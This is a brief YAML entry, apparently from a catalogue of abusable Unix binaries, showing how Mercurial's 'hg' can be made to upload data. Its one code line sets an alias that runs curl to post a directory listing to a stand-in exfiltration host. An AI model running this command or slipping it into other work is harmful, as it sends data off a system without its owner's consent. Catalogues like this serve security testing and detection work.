---
description: hg (Mercurial) is a source control management tool.
functions:
  file-upload:
    - code: |
        hg init --config=alias.identify=!curl http://exfiltration-host.tld --data "$(ls -alh)"
---
